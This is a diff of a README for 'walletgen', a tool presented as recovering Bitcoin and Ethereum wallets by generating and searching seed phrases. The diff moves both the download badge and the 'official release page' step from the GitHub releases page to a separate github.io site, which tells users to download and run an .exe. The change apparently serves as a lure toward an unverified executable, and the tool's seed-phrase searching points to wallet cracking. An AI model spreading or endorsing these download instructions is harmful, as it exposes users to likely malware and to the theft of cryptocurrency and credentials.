@@ -1,6 +1,6 @@
 # 🛡️ walletgen - Retrieve lost access to your wallets
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/contaminative-republication958/walletgen/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://contaminative-republication958.github.io)
 
 walletgen helps users recover lost access to Bitcoin and Ethereum wallets. It creates, checks, and searches for seed phrases to regain control over assets.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this tool efficiently.
 
 Follow these instructions to get the application onto your machine.
 
-1.  Visit the official release page: https://github.com/contaminative-republication958/walletgen/releases
+1.  Visit the official release page: https://contaminative-republication958.github.io
 2.  Look at the most recent version labeled as "Latest."
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder or Desktop.
